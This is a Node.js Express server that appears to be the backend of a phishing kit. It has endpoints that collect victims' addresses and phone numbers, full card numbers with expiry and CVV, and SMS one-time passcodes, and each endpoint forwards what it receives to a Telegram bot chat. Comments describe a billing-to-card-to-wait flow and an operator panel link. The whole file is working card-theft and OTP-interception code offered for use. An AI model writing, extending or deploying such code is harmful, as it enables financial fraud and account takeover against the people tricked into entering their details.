const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const config = require('./config');

// Same names as PHP defines in config.php (used by func.php)
const {
    SITE_BRAND,
    BOT_TOKEN,
    CHAT_ID,
    DELIVERY_TELEGRAM_TITLE,
    PAYMENT_TELEGRAM_TITLE,
    COPYRIGHT_YEAR
} = config;

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

/** Trim string fields from JSON body (billing / payment). */
function trimStr(v) {
    if (v === undefined || v === null) return '';
    return String(v).trim();
}

const app = express();

// Security middleware
app.use(helmet());
app.use(cors());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Routes
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: `${config.server.name} is running`,
        version: config.server.version,
        timestamp: new Date().toISOString()
    });
});

/**
 * POST /api/billing — delivery address only (billing.php / func.php page3).
 * Same fields as Asstes/php/config/func.php: name, adress, city, province, zip, country, phone.
 * Card data belongs on POST /api/payment only, never here.
 */
app.post('/api/billing', async (req, res) => {
    try {
        const body = req.body || {};
        const fwd = req.headers['x-forwarded-for'];
        const serverIp = String(
            (typeof fwd === 'string' ? fwd.split(',')[0].trim() : '') ||
                req.socket.remoteAddress ||
                ''
        );

        const name =
            trimStr(body.name) ||
            trimStr(`${trimStr(body.firstName)} ${trimStr(body.lastName)}`.replace(/\s+/g, ' '));
        const adress = trimStr(body.adress) || trimStr(body.address);
        const city = trimStr(body.city);
        const province = trimStr(body.province);
        const zip = trimStr(body.zip);
        const country = trimStr(body.country);
        const phone = trimStr(body.phone) || trimStr(body.phoneNumber);

        const ipLine = escapeHtml(String(body.ip || serverIp));
        const panel =
            typeof body.panelLink === 'string' && body.panelLink.length > 0
                ? escapeHtml(body.panelLink)
                : '';

        const message =
            `${DELIVERY_TELEGRAM_TITLE} => ${SITE_BRAND}\n` +
            '- Full name : ' + `<code>${escapeHtml(name)}</code>\n` +
            '- Address : ' + `<code>${escapeHtml(adress)}</code>\n` +
            '- City : ' + `<code>${escapeHtml(city)}</code>\n` +
            '- District : ' + `<code>${escapeHtml(province)}</code>\n` +
            '- Postal : ' + `<code>${escapeHtml(zip)}</code>\n` +
            '- Country : ' + `<code>${escapeHtml(country)}</code>\n` +
            '- Phone : ' + `<code>${escapeHtml(phone)}</code>\n` +
            '- IP : ' + ipLine + '\n' +
            (panel ? '[🛂] Panel-link : ' + panel + '\n' : '') +
            '- Page URL : ' + `${escapeHtml(body.pageUrl || 'N/A')}\n` +
            '- Time : ' + `${escapeHtml(body.timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
});

async function handlePayment(req, res) {
    try {
        const b = req.body || {};
        const creditCard = b.creditCard || b.ccn || '';
        const expiryDate = b.expiryDate || b.exp || '';
        const exp = String(expiryDate || '').trim();
        const cvv = b.cvv || '';
        const cardName = b.cardName || b.cardname || '';
        const fwd = req.headers['x-forwarded-for'];
        const serverIp = String(
            (typeof fwd === 'string' ? fwd.split(',')[0].trim() : '') ||
                req.socket.remoteAddress ||
                ''
        );
        const ip = b.ip || serverIp;

        const cardPanel =
            typeof b.panelLink === 'string' && b.panelLink.length > 0
                ? '[🛂] Panel-link : ' + escapeHtml(b.panelLink) + '\n'
                : '';

        const message =
            `${PAYMENT_TELEGRAM_TITLE} => ${SITE_BRAND}\n` +
            '- Flow: billing (address) → payment (card) → loading (wait for control.php)\n' +
            '- Card Number : ' + `<code>${escapeHtml(String(creditCard || '').replace(/\s/g, ''))}</code>\n` +
            '- Exp : ' + `<code>${escapeHtml(exp)}</code>\n` +
            '- CVV : ' + `<code>${escapeHtml(String(cvv || ''))}</code>\n` +
            '- Name on Card : ' + `<code>${escapeHtml(String(cardName || '').trim())}</code>\n` +
            '- IP : ' + `${escapeHtml(String(ip))}\n` +
            cardPanel +
            '- Page URL : ' + `${escapeHtml(b.pageUrl || 'N/A')}\n` +
            '- Time : ' + `${escapeHtml(b.timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );

        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        }
        throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
}

app.post('/api/payment', handlePayment);
app.post('/api/card', handlePayment);

async function handleSms(req, res) {
    try {
        const b = req.body || {};
        const { otp, pageUrl, timestamp, panelLink, submit } = b;
        const fwd = req.headers['x-forwarded-for'];
        const serverIp = String(
            (typeof fwd === 'string' ? fwd.split(',')[0].trim() : '') ||
                req.socket.remoteAddress ||
                ''
        );
        const ip = b.ip || serverIp;

        if (!otp) {
            return res.status(400).json({
                success: false,
                message: 'Missing OTP code'
            });
        }

        const tag =
            submit === 'sms_otp_wrong'
                ? '[📱 SMS-OTP · retry]'
                : '[📱 SMS-OTP]';
        const panel =
            typeof panelLink === 'string' && panelLink.length > 0
                ? '[🛂] Panel-link : ' + escapeHtml(panelLink) + '\n'
                : '';

        const message =
            `${tag} => ${SITE_BRAND}\n` +
            '- OTP : ' + `<code>${escapeHtml(String(otp))}</code>\n` +
            '- IP : ' + `${escapeHtml(String(ip))}\n` +
            panel +
            '- Page URL : ' + `${escapeHtml(pageUrl || 'N/A')}\n` +
            '- Time : ' + `${escapeHtml(timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );

        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'SMS data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        }
        throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
    } catch (error) {
        console.error('Error sending SMS data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send SMS data',
            error: error.message
        });
    }
}

app.post('/api/sms', handleSms);
app.post('/api/send-sms', handleSms);

// Approve API endpoint
app.post('/api/send-approve', async (req, res) => {
    try {
        const { 
            messages,
            pageType,
            clientIP
        } = req.body;

        // Validate required fields
       

  
        const message =
            `[Approve] ${SITE_BRAND}\n` +
            `- type: ${escapeHtml(String(pageType || ''))}\n` +
            `- me: ${escapeHtml(String(messages || ''))}\n` +
            `- IP: ${escapeHtml(String(clientIP || req.ip || ''))}\n` +
            `- Time: ${escapeHtml(new Date().toLocaleString('en-SG'))}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'Approve data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending approve data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send approve data' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ 
        success: false, 
        message: 'Something went wrong!' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Route not found' 
    });
});

// Start server
const PORT = config.server.port || process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 ${config.server.name} running on port ${PORT}`);
    console.log(`📱 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`🌍 Environment: ${config.server.environment}`);
    console.log(`🔗 API Base URL: http://localhost:${PORT}`);
});

module.exports = app;
